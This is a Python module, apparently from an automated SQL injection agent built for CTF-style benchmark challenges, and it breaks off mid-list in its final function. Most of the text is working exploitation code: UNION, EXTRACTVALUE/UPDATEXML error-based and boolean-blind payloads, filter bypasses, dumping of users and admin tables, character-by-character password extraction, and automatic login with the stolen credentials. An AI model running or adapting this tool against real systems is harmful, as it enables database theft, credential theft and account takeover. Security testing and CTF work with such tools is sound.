"""
Aggressive SQLMap-style SQL Injection Verifier

Fast, response-driven testing with automatic data extraction.
Inspired by SQLMap's approach:
1. Error-based (fastest - 2 seconds)
2. UNION-based with column counting (5-10 seconds)
3. Boolean-based with quick confirmation (10 seconds)
4. Time-based only if nothing else works (60+ seconds)
"""

import re
import asyncio
import logging
from typing import Dict, List, Optional, Tuple
from playwright.async_api import async_playwright, Page

from ..models import SQLiVerificationResult, SQLiType, DatabaseType


class AggressiveSQLiVerifier:
    """Fast, aggressive SQLi detection with automatic exploitation"""

    def __init__(self):
        self.logger = logging.getLogger(self.__class__.__name__)
        self.discovered_database = None
        self.discovered_columns = None
        self.filter_profile = None  # Will be set if filter bypass needed

    def _apply_bypass(self, payload: str) -> str:
        """Apply filter bypass to payload if filter profile exists"""
        if not self.filter_profile or not hasattr(self.filter_profile, 'working_bypass'):
            return payload

        if self.filter_profile.working_bypass and self.filter_profile.working_bypass.value != "none":
            # Import and apply bypass
            from ..analyzers.filter_detector import SQLiFilterDetector
            detector = SQLiFilterDetector()
            bypassed = detector.apply_bypass(payload, self.filter_profile)
            self.logger.debug(f"[BYPASS] {payload} → {bypassed}")
            return bypassed

        return payload

    async def verify_aggressive(
        self,
        target_url: str,
        parameter: str,
        parameter_location: str = "query",
        filter_profile=None,
        graphql_field: str = "",
        graphql_return_fields: List[str] = None
    ) -> Dict[str, any]:
        """
        Aggressive verification with automatic exploitation

        Returns:
            {
                'vulnerable': bool,
                'type': str,  # error/union/boolean/time
                'confidence': int,
                'database': str,
                'extracted_data': dict,  # Actual extracted data!
                'exploit_url': str
            }
        """

        # GraphQL endpoint detected - use GraphQL-specific testing
        if parameter_location == "graphql" and graphql_field:
            self.logger.info(f"[GRAPHQL] Detected GraphQL endpoint, using GraphQL SQLi testing")
            return await self._verify_graphql_sqli(target_url, parameter, graphql_field, filter_profile, graphql_return_fields)

        self.logger.info(f"[AGGRESSIVE] Starting fast SQLMap-style testing on {parameter}")

        # Set filter profile for bypass application
        self.filter_profile = filter_profile
        if filter_profile and hasattr(filter_profile, 'working_bypass') and filter_profile.working_bypass:
            self.logger.info(f"[BYPASS] Filter bypass enabled: {filter_profile.working_bypass.value}")

        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context()
            page = await context.new_page()

            try:
                # Get baseline response for comparison (needed for UNION data extraction)
                baseline = await self._fetch(page, target_url, parameter, "test", parameter_location)

                # Phase 1: ERROR-BASED (fastest - 2 seconds)
                self.logger.info("[AGGRESSIVE] Phase 1/5: Error-based detection (2s)")
                error_result = await self._test_error_based(page, target_url, parameter, parameter_location)
                if error_result['vulnerable']:
                    self.logger.info("[✓✓✓] ERROR-BASED SQLi found!")
                    # Don't return yet - continue to UNION for data extraction
                    self.logger.info("[AGGRESSIVE] Continuing to UNION-based for data extraction...")

                # Phase 2: UNION-BASED (fast - 10 seconds)
                # Always test UNION even if error-based found, because UNION extracts actual data
                self.logger.info("[AGGRESSIVE] Phase 2/5: UNION-based detection (10s)")
                union_result = await self._test_union_fast(page, target_url, parameter, parameter_location)
                if union_result['vulnerable']:
                    self.logger.info("[✓✓✓] UNION-BASED SQLi found!")
                    # EXTRACT DATA IMMEDIATELY
                    # Pass baseline for comparison
                    union_result['baseline'] = baseline
                    extracted = await self._extract_data_union(page, target_url, parameter, union_result, parameter_location)
                    union_result['extracted_data'] = extracted

                    # Check if we found a FLAG - if so, we're done!
                    has_flag = any(
                        re.search(r'FLAG\{[^}]+\}|flag\{[^}]+\}|CTF\{[^}]+\}', str(v), re.I)
                        for v in extracted.values()
                    ) if extracted else False

                    if has_flag:
                        self.logger.info("[AGGRESSIVE] ✓ FLAG found in UNION extraction - stopping")
                        return union_result
                    else:
                        self.logger.info("[AGGRESSIVE] UNION found SQLi but no FLAG - continuing to Boolean for auth bypass...")

                # If error-based was found but UNION failed, keep it for fallback
                # But don't return yet - try Boolean for potential auth bypass

                # Phase 3: BOOLEAN-BASED (medium - 15 seconds)
                self.logger.info("[AGGRESSIVE] Phase 3/5: Boolean-based detection (15s)")
                boolean_result = await self._test_boolean_fast(page, target_url, parameter, parameter_location)
                if boolean_result['vulnerable']:
                    self.logger.info("[✓✓] BOOLEAN-BASED SQLi found!")
                    return boolean_result

                # Phase 3.5: BOOLEAN BLIND EXTRACTION (password extraction + login)
                # For cases like XBEN-095-24 where we need to extract password and login
                self.logger.info("[AGGRESSIVE] Phase 3.5/6: Boolean blind character extraction (30s)")
                blind_result = await self._test_boolean_blind_extraction(page, target_url, parameter, parameter_location)
                if blind_result['vulnerable']:
                    self.logger.info("[✓✓✓] BOOLEAN-BLIND EXTRACTION successful!")
                    if blind_result.get('extracted_data', {}).get('flag'):
                        self.logger.info("[✓✓✓] FLAG extracted via login!")
                    return blind_result

                # Phase 3.6: GENERAL BLIND EXTRACTION (subquery-based credential extraction)
                # For cases like XBEN-040-24 where we need to extract from admins table
                self.logger.info("[AGGRESSIVE] Phase 3.6/6: General blind extraction from tables (60s)")
                general_blind_result = await self._test_general_blind_extraction(page, target_url, parameter, parameter_location)
                if general_blind_result['vulnerable']:
                    self.logger.info("[✓✓✓] GENERAL BLIND EXTRACTION successful!")
                    if general_blind_result.get('extracted_data', {}).get('flag'):
                        self.logger.info("[✓✓✓] FLAG extracted!")
                    return general_blind_result

                # Phase 4: TIME-BASED (slowest - only if needed)
                self.logger.info("[AGGRESSIVE] Phase 4/5: Time-based detection (60s)")
                time_result = await self._test_time_based(page, target_url, parameter, parameter_location)
                if time_result['vulnerable']:
                    self.logger.info("[✓] TIME-BASED SQLi found!")
                    return time_result

                # If we got here, no technique found FLAG or returned early
                # Return best result we found (prioritize: union > error > nothing)
                if union_result and union_result.get('vulnerable'):
                    self.logger.info("[AGGRESSIVE] Returning UNION result (no FLAG found but SQLi confirmed)")
                    return union_result
                elif error_result and error_result.get('vulnerable'):
                    self.logger.info("[AGGRESSIVE] Returning ERROR-BASED result")
                    return error_result

                # Not vulnerable
                return {
                    'vulnerable': False,
                    'confidence': 0,
                    'message': 'No SQLi detected with aggressive testing'
                }

            finally:
                await browser.close()

    async def _test_error_based(
        self,
        page: Page,
        target_url: str,
        parameter: str,
        location: str
    ) -> Dict:
        """
        Test error-based SQLi (fastest method)

        Strategy:
        1. Inject syntax errors and look for database error messages
        2. Extract database type, version from errors
        3. Use EXTRACTVALUE/UPDATEXML to leak data through error messages
        4. Extract actual FLAG data from common tables
        """

        # NOTE: Static payload databases removed for security purposes.
        # The framework uses LLM-driven payload generation instead.
        # See: src/sqli_agent/analyzers/llm_sqli_engine.py
        error_payloads = []

        detected_database = 'unknown'
        basic_vuln_found = False

        for payload in error_payloads:
            response = await self._fetch(page, target_url, parameter, payload, location)

            # Check for database error messages
            errors = self._extract_error_info(response)
            if errors['has_error']:
                self.logger.info(f"[ERROR-BASED] Found: {errors['database']} - {errors['message'][:60]}")
                detected_database = errors['database']
                basic_vuln_found = True
                break  # Found error-based SQLi, now try data extraction

        # ALWAYS try EXTRACTVALUE/UPDATEXML data extraction (even without visible errors)
        # This technique works even when normal SQL errors are suppressed
        self.logger.info("[ERROR-BASED] Attempting data extraction via EXTRACTVALUE/UPDATEXML...")

        # Try to extract data from common tables using EXTRACTVALUE/UPDATEXML
        extracted_data = await self._extract_via_error_functions(
            page, target_url, parameter, location
        )

        # Check if we found FLAG
        has_flag = any(
            re.search(r'FLAG\{[^}]+\}|flag\{[^}]+\}|CTF\{[^}]+\}', str(v), re.I)
            for v in extracted_data.values()
        ) if extracted_data else False

        if has_flag or extracted_data:
            self.logger.info(f"[ERROR-BASED] ✓ Data extracted via EXTRACTVALUE: {list(extracted_data.keys())}")
            return {
                'vulnerable': True,
                'type': 'error_based',
                'confidence': 95,
                'database': detected_database if detected_database != 'unknown' else 'mysql',
                'payload': 'EXTRACTVALUE/UPDATEXML',
                'exploit_url': self._build_url(target_url, parameter, "' AND EXTRACTVALUE(...)--"),
                'extracted_data': extracted_data,
                'error_message': 'Data extracted via XPATH error functions'
            }
        elif basic_vuln_found:
            # Found basic SQLi but EXTRACTVALUE didn't work
            self.logger.info("[ERROR-BASED] Basic SQLi confirmed but no EXTRACTVALUE data")
            return {
                'vulnerable': True,
                'type': 'error_based',
                'confidence': 85,
                'database': detected_database,
                'payload': error_payloads[0],
                'exploit_url': self._build_url(target_url, parameter, error_payloads[0]),
                'extracted_data': {},
                'error_message': 'Error-based SQLi confirmed'
            }

        return {'vulnerable': False}

    async def _test_union_fast(
        self,
        page: Page,
        target_url: str,
        parameter: str,
        location: str
    ) -> Dict:
        """
        Fast UNION-based detection with immediate data extraction

        Strategy:
        1. Try common column counts first (1-5)
        2. Detect success by looking for marker string
        3. Extract database info immediately
        """

        # Get baseline response
        baseline = await self._fetch(page, target_url, parameter, "test", location)
        baseline_text = self._extract_text(baseline)

        # Try different prefixes and column counts
        prefixes = ["'", "%'", "' ", "%' ", "1'"]

        for prefix in prefixes:
            # Try 1-10 columns (most common)
            for cols in range(1, 11):
                # Use marker string to detect success
                marker = "___SQLI_MARKER___"

                # Build column list properly (no trailing comma for single column)
                if cols == 1:
                    columns = f"'{marker}'"
                else:
                    nulls = ['NULL'] * (cols - 1)
                    columns = f"'{marker}',{','.join(nulls)}"

                payload = f"{prefix} UNION SELECT {columns}--"
                payload = self._apply_bypass(payload)

                self.logger.debug(f"[UNION] Testing: {payload[:80]}...")
                response = await self._fetch(page, target_url, parameter, payload, location)
                response_text = self._extract_text(response)

                # Success: marker appears in response
                if marker in response_text:
                    self.logger.info(f"[UNION] ✓ Found {cols} columns with prefix '{prefix}'")

                    return {
                        'vulnerable': True,
                        'type': 'union_based',
                        'confidence': 95,
                        'database': 'unknown',
                        'payload': payload,
                        'exploit_url': self._build_url(target_url, parameter, payload),
                        'columns': cols,
                        'prefix': prefix,
                        'marker_found': True
                    }

                # Also check for no SQL error = potential success
                if not self._has_sql_error(response):
                    # Might be successful, verify with actual data
                    if cols == 1:
                        test_columns = "version()"
                    else:
                        nulls_test = ['NULL'] * (cols - 1)
                        test_columns = f"version(),{','.join(nulls_test)}"

                    test_payload = f"{prefix} UNION SELECT {test_columns}--"
                    test_payload = self._apply_bypass(test_payload)
                    self.logger.debug(f"[UNION] Verifying with version: {test_payload[:80]}...")
                    test_response = await self._fetch(page, target_url, parameter, test_payload, location)
                    test_text = self._extract_text(test_response)

                    # Look for version string
                    if re.search(r'(PostgreSQL|MySQL|MariaDB|Microsoft SQL)', test_text, re.I):
                        self.logger.info(f"[UNION] ✓ Found {cols} columns (version detected)")

                        return {
                            'vulnerable': True,
                            'type': 'union_based',
                            'confidence': 90,
                            'database': 'detected_from_version',
                            'payload': test_payload,
                            'exploit_url': self._build_url(target_url, parameter, test_payload),
                            'columns': cols,
                            'prefix': prefix
                        }

                    # Also try just checking if response changed significantly
                    if len(response_text) > 0 and abs(len(response_text) - len(baseline_text)) < 100:
                        # Response similar length, no error - likely successful UNION
                        self.logger.info(f"[UNION] ✓ Found {cols} columns (no error, stable response)")

                        return {
                            'vulnerable': True,
                            'type': 'union_based',
                            'confidence': 75,
                            'database': 'unknown',
                            'payload': payload,
                            'exploit_url': self._build_url(target_url, parameter, payload),
                            'columns': cols,
                            'prefix': prefix
                        }

        return {'vulnerable': False}

    async def _extract_data_union(
        self,
        page: Page,
        target_url: str,
        parameter: str,
        union_result: Dict,
        location: str
    ) -> Dict:
        """
        Extract actual data using UNION injection

        This is what SQLMap does after finding UNION!
        """

        cols = union_result['columns']
        prefix = union_result['prefix']
        baseline_html = union_result.get('baseline', '')

        # Helper to build column list properly
        def build_columns(expr):
            if cols == 1:
                return expr
            else:
                nulls = ['NULL'] * (cols - 1)
                return f"{expr},{','.join(nulls)}"

        # Helper to extract ONLY new data (not in baseline)
        def extract_new_data(response_html):
            """Extract only data that wasn't in the baseline response"""
            import re

            # Extract all <p> tag content
            baseline_paragraphs = set(re.findall(r'<p>([^<]+)</p>', baseline_html))
            response_paragraphs = re.findall(r'<p>([^<]+)</p>', response_html)

            # Find NEW paragraphs (injected data)
            new_data = []
            for p in response_paragraphs:
                p_clean = p.strip()
                if (p_clean not in baseline_paragraphs and
                    len(p_clean) > 3 and
                    p_clean.lower() not in ['lorem ipsum dolor sit amet, consectetur adipiscing elit.',
                                            'fusce ut pellentesque urna.',
                                            'praesent scelerisque nunc.']):
                    new_data.append(p_clean)

            return new_data

        extracted = {}

        # 1. Extract database version
        self.logger.info("[EXTRACT] Getting database version...")
        version_payloads = [
            f"{prefix} UNION SELECT {build_columns('version()')}--",  # PostgreSQL/MySQL
            f"{prefix} UNION SELECT {build_columns('@@version')}--",  # MySQL/MSSQL
        ]

        for vp in version_payloads:
            response = await self._fetch(page, target_url, parameter, vp, location)
            text = self._extract_text(response)
            version_match = re.search(r'(PostgreSQL|MySQL|MariaDB|Microsoft SQL)[\s\d\.]+', text, re.I)
            if version_match:
                extracted['version'] = version_match.group(0)
                self.logger.info(f"[EXTRACT] ✓ Version: {extracted['version']}")
                break

        # 2. Extract current database
        self.logger.info("[EXTRACT] Getting current database...")
        db_payloads = [
            f"{prefix} UNION SELECT {build_columns('database()')}--",  # MySQL
            f"{prefix} UNION SELECT {build_columns('current_database()')}--",  # PostgreSQL
            f"{prefix} UNION SELECT {build_columns('DB_NAME()')}--",  # MSSQL
        ]

        for dp in db_payloads:
            response = await self._fetch(page, target_url, parameter, dp, location)
            text = self._extract_text(response)
            # Look for database name (alphanumeric, not NULL)
            db_match = re.search(r'([a-z][a-z0-9_]{2,20})', text, re.I)
            if db_match and db_match.group(1).lower() not in ['null', 'test', 'lorem']:
                extracted['current_database'] = db_match.group(1)
                self.logger.info(f"[EXTRACT] ✓ Database: {extracted['current_database']}")
                break

        # 3. Direct data extraction from common CTF tables
        # Skip table enumeration (unreliable) and directly try common tables
        self.logger.info("[EXTRACT] Attempting direct data extraction from common tables...")

        # Try common CTF/challenge tables with common columns
        table_column_attempts = [
            ('flag', ['token', 'flag', 'value', 'data', 'secret', 'key']),
            ('flags', ['token', 'flag', 'value', 'data', 'secret', 'key']),
            ('jobs', ['description', 'details', 'content', 'data', 'name', 'info']),  # Added jobs table
            ('posts', ['content', 'body', 'description', 'data', 'text']),
            ('items', ['description', 'data', 'content', 'value', 'details']),
            ('users', ['username', 'password', 'email', 'name', 'id']),
            ('admin', ['username', 'password', 'email', 'name', 'id']),
            ('secrets', ['value', 'data', 'secret', 'token']),
        ]

        for table, columns in table_column_attempts:
            self.logger.info(f"[EXTRACT] Trying table '{table}'...")

            # FIRST: ALWAYS try SELECT * to get ALL columns (works regardless of column count!)
            all_cols_payload = f"{prefix} UNION SELECT * FROM {table}--"
            all_cols_payload = self._apply_bypass(all_cols_payload)
            response = await self._fetch(page, target_url, parameter, all_cols_payload, location)

            if not self._has_sql_error(response):
                # Check ENTIRE response for FLAG pattern (ignores baseline!)
                flag_found = re.search(r'FLAG\{[^}]+\}|flag\{[^}]+\}|CTF\{[^}]+\}', response, re.I)
                if flag_found:
                    flag_value = flag_found.group(0)
                    extracted[f'{table}_ALL'] = flag_value
                    self.logger.info(f"[EXTRACT] ✓✓✓ FLAG FOUND in {table} (SELECT *):")
                    self.logger.info(f"    → {flag_value}")
                    self.logger.info(f"[EXTRACT] ✓✓✓ FLAG PATTERN DETECTED!")
                    break

            # SECOND: Try specific columns
            for col in columns:
                data_payload = f"{prefix} UNION SELECT {build_columns(col)} FROM {table}--"
                data_payload = self._apply_bypass(data_payload)
                response = await self._fetch(page, target_url, parameter, data_payload, location)

                # Check if we got actual data (not SQL error)
                if not self._has_sql_error(response):
                    # First check ENTIRE response for FLAG pattern (don't filter by baseline!)
                    flag_found = re.search(r'FLAG\{[^}]+\}|flag\{[^}]+\}|CTF\{[^}]+\}', response, re.I)

                    if flag_found:
                        # Found a flag! Extract it
                        flag_value = flag_found.group(0)
                        extracted[f'{table}_{col}'] = flag_value
                        self.logger.info(f"[EXTRACT] ✓✓✓ FLAG FOUND in {table}.{col}:")
                        self.logger.info(f"    → {flag_value}")

                        # If this is the flag table or we found FLAG pattern, we found what we're looking for!
                        if table in ['flag', 'flags'] or flag_found:
                            self.logger.info(f"[EXTRACT] ✓✓✓ FLAG PATTERN DETECTED!")
                            break
                    else:
                        # No flag found, extract new data using baseline comparison
                        new_data = extract_new_data(response)

                        if new_data:
                            extracted[f'{table}_{col}'] = '\n'.join(new_data[:10])  # First 10 lines
                            self.logger.info(f"[EXTRACT] ✓✓✓ DATA FROM {table}.{col}:")
                            for line in new_data[:5]:
                                self.logger.info(f"    → {line}")

            # Stop after finding flag (check if any extracted data contains FLAG pattern)
            has_flag_data = any(
                re.search(r'FLAG\{[^}]+\}|flag\{[^}]+\}|CTF\{[^}]+\}', str(v), re.I)
                for v in extracted.values()
            )
            if has_flag_data or any(k.startswith(('flag_', 'flags_')) for k in extracted.keys()):
                self.logger.info("[EXTRACT] ✓ Stopping extraction - flag data found")
                break

        return extracted

    async def _extract_via_error_functions(
        self,
        page: Page,
        target_url: str,
        parameter: str,
        location: str
    ) -> Dict:
        """
        Extract data using EXTRACTVALUE/UPDATEXML error functions

        These MySQL functions trigger XPATH errors that leak data in error messages.
        Used when page doesn't display query results but shows errors.

        Technique used in XBEN-071-24.
        """
        extracted = {}

        # Common tables and columns to try
        table_column_attempts = [
            ('flag', ['flag', 'value', 'token', 'data']),
            ('flags', ['flag', 'value', 'token', 'data']),
            ('secrets', ['secret', 'value', 'data']),
            ('users', ['password', 'email', 'username']),
            ('admin', ['password', 'email', 'username']),
        ]

        for table, columns in table_column_attempts:
            for column in columns:
                self.logger.info(f"[ERROR-EXTRACT] Trying {table}.{column}...")

                # Try EXTRACTVALUE first (MySQL)
                # EXTRACTVALUE has 32-char limit, so we need to extract in chunks
                full_value = ""
                offset = 1
                max_chunks = 5  # Max 5 chunks = 160 chars

                while offset <= max_chunks * 32:
                    if offset == 1:
                        # First chunk: extract from beginning
                        payload = f"' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT {column} FROM {table} LIMIT 1)))-- -"
                    else:
                        # Subsequent chunks: use SUBSTRING
                        payload = f"' AND EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING((SELECT {column} FROM {table} LIMIT 1), {offset}, 32)))-- -"

                    payload = self._apply_bypass(payload)
                    response = await self._fetch(page, target_url, parameter, payload, location)

                    # Look for XPATH error with leaked data
                    # Pattern: "XPATH syntax error: '~DATA_HERE'"
                    xpath_match = re.search(r"XPATH syntax error: '~([^']*)'", response, re.I)

                    if xpath_match:
                        chunk = xpath_match.group(1)
                        self.logger.info(f"[ERROR-EXTRACT] ✓ Extracted chunk at offset {offset}: {chunk[:50]}...")
                        full_value += chunk

                        # Check if this chunk is FLAG pattern
                        if re.search(r'FLAG\{[^}]+\}|flag\{[^}]+\}|CTF\{[^}]+\}', chunk, re.I):
                            self.logger.info(f"[ERROR-EXTRACT] ✓✓✓ FLAG PATTERN FOUND!")

                        # If chunk is less than 31 chars, we've reached the end
                        if len(chunk) < 31:
                            break

                        offset += 32
                    else:
                        # Try UPDATEXML as alternative (MySQL)
                        alt_payload = f"' AND 1=UPDATEXML(1, CONCAT(0x7e, SUBSTRING((SELECT {column} FROM {table} LIMIT 1), {offset}, 32)), 1)-- -"
                        alt_payload = self._apply_bypass(alt_payload)
                        alt_response = await self._fetch(page, target_url, parameter, alt_payload, location)

                        alt_match = re.search(r"XPATH syntax error: '~([^']*)'", alt_response, re.I)
                        if alt_match:
                            chunk = alt_match.group(1)
                            full_value += chunk
                            if len(chunk) < 31:
                                break
                            offset += 32
                        else:
                            # No more data or table doesn't exist
                            break

                # If we extracted any data, save it
                if full_value:
                    extracted[f'{table}_{column}'] = full_value
                    self.logger.info(f"[ERROR-EXTRACT] ✓✓ Full value extracted from {table}.{column}:")
                    self.logger.info(f"    → {full_value}")

                    # Check if we found FLAG - if so, stop
                    if re.search(r'FLAG\{[^}]+\}|flag\{[^}]+\}|CTF\{[^}]+\}', full_value, re.I):
                        self.logger.info(f"[ERROR-EXTRACT] ✓✓✓ FLAG FOUND - stopping extraction")
                        return extracted

        return extracted

    async def _test_boolean_fast(
        self,
        page: Page,
        target_url: str,
        parameter: str,
        location: str
    ) -> Dict:
        """
        Fast boolean-based detection (2 tests only)
        """

        # Get baseline
        baseline = await self._fetch(page, target_url, parameter, "test", location)
        baseline_len = len(baseline)
        self.logger.info(f"[BOOLEAN] Baseline length: {baseline_len}")

        # Test multiple TRUE/FALSE variations including auth bypass
        test_cases = [
            # Standard boolean blind
            ("' OR '1'='1", "' AND '1'='2", "boolean_blind"),
            # Auth bypass with SQL comment (for login forms)
            ("' OR '1'='1'-- -", "' AND '1'='2'-- -", "auth_bypass"),
            ("admin' OR '1'='1'-- -", "admin' AND '1'='2'-- -", "auth_bypass"),
        ]

        for true_base, false_base, sqli_type in test_cases:
            # Apply filter bypass if needed
            true_payload = self._apply_bypass(true_base)
            false_payload = self._apply_bypass(false_base)

            self.logger.info(f"[BOOLEAN] Testing TRUE: {true_payload}")
            true_response = await self._fetch(page, target_url, parameter, true_payload, location)
            true_len = len(true_response)
            self.logger.info(f"[BOOLEAN] TRUE response length: {true_len}")

            self.logger.info(f"[BOOLEAN] Testing FALSE: {false_payload}")
            false_response = await self._fetch(page, target_url, parameter, false_payload, location)
            false_len = len(false_response)
            self.logger.info(f"[BOOLEAN] FALSE response length: {false_len}")

            # Check for FLAG pattern in TRUE response (auth bypass success)
            flag_match = re.search(r'FLAG\{[^}]+\}|flag\{[^}]+\}|CTF\{[^}]+\}', true_response, re.I)
            if flag_match:
                flag_value = flag_match.group(0)
                self.logger.info(f"[BOOLEAN] ✓✓✓ FLAG FOUND in TRUE response!")
                self.logger.info(f"    → {flag_value}")
                return {
                    'vulnerable': True,
                    'type': sqli_type,
                    'confidence': 95,
                    'database': 'unknown',
                    'payload': true_payload,
                    'exploit_url': self._build_url(target_url, parameter, true_payload),
                    'extracted_data': {'flag': flag_value},
                    'true_len': true_len,
                    'false_len': false_len,
                    'diff': true_len - false_len
                }

            # Check if TRUE returns more data than FALSE
            if true_len > false_len and true_len > baseline_len:
                diff = true_len - false_len
                if diff > (baseline_len * 0.1):  # 10% difference
                    return {
                        'vulnerable': True,
                        'type': sqli_type,
                        'confidence': 75,
                        'database': 'unknown',
                        'payload': true_payload,
                        'exploit_url': self._build_url(target_url, parameter, true_payload),
                        'true_len': true_len,
                        'false_len': false_len,
                        'diff': diff
                    }

        return {'vulnerable': False}

    async def _test_boolean_blind_extraction(
        self,
        page: Page,
        target_url: str,
        parameter: str,
        location: str
    ) -> Dict:
        """
        Boolean-based blind SQLi with character-by-character password extraction

        Used for XBEN-095-24 style challenges where:
        1. Search endpoint has boolean blind SQLi
        2. Login endpoint requires extracted password
        3. Need to extract password char-by-char using MID() and ASCII()

        Returns extracted data including password and flag if login succeeds
        """

        self.logger.info("[BOOLEAN-BLIND] Testing character extraction with MID() and ASCII()...")

        # IMPORTANT: Many PHP apps use $_REQUEST which accepts both GET and POST
        # If this is a search endpoint, test via query parameters even if form is POST
        test_location = location
        if location == "post" and ("search" in target_url.lower() or "query" in target_url.lower()):
            self.logger.info("[BOOLEAN-BLIND] Search endpoint detected - testing via query parameters (GET)")
            test_location = "query"

        # Test if boolean blind SQLi works with content-based detection
        # Try: xxx"||password="KNOWN_VALUE (should give different response than baseline)

        # First, detect if this is a users table with password column
        baseline = await self._fetch(page, target_url, parameter, "xxx", test_location)

        # Test various boolean conditions to detect if password column exists
        # CRITICAL: Use TRUE vs FALSE conditions, not two FALSE conditions
        test_conditions = [
            # MySQL with double quotes - test TRUE (LENGTH>0) vs FALSE (LENGTH<0)
            ('xxx"||LENGTH(password)>0||"', 'xxx"||LENGTH(password)<0||"'),
            # Alternative: test with 1=1 (TRUE) vs 1=2 (FALSE)
            ('xxx"||1=1||"', 'xxx"||1=2||"'),
            # MySQL with single quotes
            ("xxx'||LENGTH(password)>0||'", "xxx'||LENGTH(password)<0||'"),
            # Using OR instead of ||
            ('xxx" OR LENGTH(password)>0 OR "x"="', 'xxx" OR LENGTH(password)<0 OR "x"="'),
        ]

        true_response = None
        false_response = None
        working_prefix = None

        for true_cond, false_cond in test_conditions:
            true_resp = await self._fetch(page, target_url, parameter, true_cond, test_location)
            false_resp = await self._fetch(page, target_url, parameter, false_cond, test_location)

            # Check if responses are different (boolean blind works)
            if len(true_resp) != len(false_resp) or true_resp != false_resp:
                # Found working boolean blind condition!
                self.logger.info(f"[BOOLEAN-BLIND] ✓ Working condition: {true_cond}")
                true_response = true_resp
                false_response = false_resp

                # Extract prefix for building payloads
                if '||' in true_cond:
                    working_prefix = true_cond.split('||')[0] + '||'
                elif ' OR ' in true_cond:
                    working_prefix = true_cond.split(' OR ')[0] + ' OR '

                break

        if not working_prefix:
            self.logger.info("[BOOLEAN-BLIND] No boolean blind SQLi detected")
            return {'vulnerable': False}

        # Detected boolean blind SQLi! Now extract password character-by-character
        self.logger.info("[BOOLEAN-BLIND] ✓✓ Detected boolean blind SQLi!")
        self.logger.info("[BOOLEAN-BLIND] Starting password extraction...")

        extracted_password = ""
        max_length = 30  # Reasonable max password length

        for position in range(1, max_length + 1):
            # Binary search for ASCII value (33-126 printable chars)
            char_found = False

            for ascii_val in range(33, 127):
                # Test: xxx"||ASCII(MID(password,N,1))=X||"
                test_payload = f'{working_prefix}ASCII(MID(password,{position},1))={ascii_val}||"'
                test_resp = await self._fetch(page, target_url, parameter, test_payload, test_location)

                # Check if this matches the TRUE response pattern
                if len(test_resp) == len(true_response) and 'User exists' in test_resp:
                    # Found the character!
                    extracted_char = chr(ascii_val)
                    extracted_password += extracted_char
                    self.logger.info(f"[BOOLEAN-BLIND] Position {position}: '{extracted_char}' (ASCII {ascii_val})")
                    self.logger.info(f"[BOOLEAN-BLIND] Extracted so far: {extracted_password}")
                    char_found = True
                    break

            if not char_found:
                # No more characters (reached end of password)
                self.logger.info(f"[BOOLEAN-BLIND] ✓ Password extraction complete: {extracted_password}")
                break

            # Stop if we have reasonable length
            if len(extracted_password) >= 5:
                # Verify we got the full password by testing it
                verify_payload = f'{working_prefix}password="{extracted_password}"'
                verify_resp = await self._fetch(page, target_url, parameter, verify_payload, test_location)

                if 'User exists' in verify_resp:
                    self.logger.info(f"[BOOLEAN-BLIND] ✓✓ Verified password: {extracted_password}")
                    break

        # Now try to find login endpoint and authenticate
        self.logger.info("[BOOLEAN-BLIND] Searching for login endpoint...")

        # Common login paths
        from urllib.parse import urlparse
        parsed = urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        login_paths = [
            '/login.php',
            '/login',
            '/auth.php',
            '/signin.php',
            '/admin/login.php'
        ]

        flag_found = None

        for login_path in login_paths:
            login_url = base_url + login_path

            try:
                # Try to login with extracted password
                import aiohttp

                async with aiohttp.ClientSession() as session:
                    # Try common username/password combinations
                    usernames = ['admin', 'administrator', 'user', 'test']

                    for username in usernames:
                        form_data = {
                            'username': username,
                            'password': extracted_password,
                            'submit': '1'
                        }

                        async with session.post(
                            login_url,
                            data=form_data,
                            timeout=aiohttp.ClientTimeout(total=5)
                        ) as resp:
                            response_text = await resp.text()

                            # Check for FLAG in response
                            flag_match = re.search(r'FLAG\{[^}]+\}|flag\{[^}]+\}|CTF\{[^}]+\}', response_text, re.I)

                            if flag_match:
                                flag_found = flag_match.group(0)
                                self.logger.info(f"[BOOLEAN-BLIND] ✓✓✓ FLAG FOUND via login!")
                                self.logger.info(f"    Username: {username}")
                                self.logger.info(f"    Password: {extracted_password}")
                                self.logger.info(f"    → {flag_found}")

                                return {
                                    'vulnerable': True,
                                    'type': 'boolean_blind_extraction',
                                    'confidence': 95,
                                    'database': 'mysql',
                                    'payload': f'{working_prefix}ASCII(MID(password,1,1))=...',
                                    'exploit_url': self._build_url(target_url, parameter, working_prefix + 'password="' + extracted_password + '"'),
                                    'extracted_data': {
                                        'password': extracted_password,
                                        'username': username,
                                        'login_url': login_url,
                                        'flag': flag_found
                                    }
                                }
            except Exception as e:
                self.logger.debug(f"[BOOLEAN-BLIND] Login attempt failed for {login_path}: {e}")
                continue

        # No login found, but we extracted password
        if extracted_password:
            return {
                'vulnerable': True,
                'type': 'boolean_blind',
                'confidence': 85,
                'database': 'mysql',
                'payload': f'{working_prefix}ASCII(MID(password,1,1))=...',
                'exploit_url': self._build_url(target_url, parameter, working_prefix + 'password="' + extracted_password + '"'),
                'extracted_data': {'password': extracted_password}
            }

        return {'vulnerable': False}

    async def _test_general_blind_extraction(
        self,
        page: Page,
        target_url: str,
        parameter: str,
        location: str
    ) -> Dict:
        """
        Generalized boolean-based blind SQLi data extraction

        Works for cases like XBEN-040-24 where:
        1. SQLi is in a different endpoint than login
        2. Need to extract credentials from admins/users table via subquery
        3. Use extracted creds to login and get FLAG

        Uses: ' AND (SELECT ASCII(SUBSTRING(col,pos,1)) FROM table LIMIT 1)=X--
        """

        self.logger.info("[BLIND-EXTRACT] Starting generalized blind data extraction...")

        # Step 1: Detect quote context by testing different injection types
        self.logger.info("[BLIND-EXTRACT] Detecting injection context...")

        baseline = await self._fetch(page, target_url, parameter, "test", location)
        baseline_len = len(baseline)

        # Test different quote contexts - use OR-based payloads that work regardless of base value
        # Key insight: ' OR '1'='1' always returns TRUE regardless of whether base value exists
        quote_tests = [
            # Single quote - without comment (closes the string naturally)
            ("'", "' OR '1'='1", "' AND '1'='2"),
            # Single quote - with comment terminator
            ("'", "' OR '1'='1'-- -", "' AND '1'='2'-- -"),
            # Alternative: close the string and use OR
            ("'", "xxx' OR 1=1-- -", "xxx' AND 1=2-- -"),
            # Double quote
            ('"', '" OR "1"="1', '" AND "1"="2'),
            ('"', '" OR "1"="1"-- -', '" AND "1"="2"-- -'),
            # Numeric/no quote
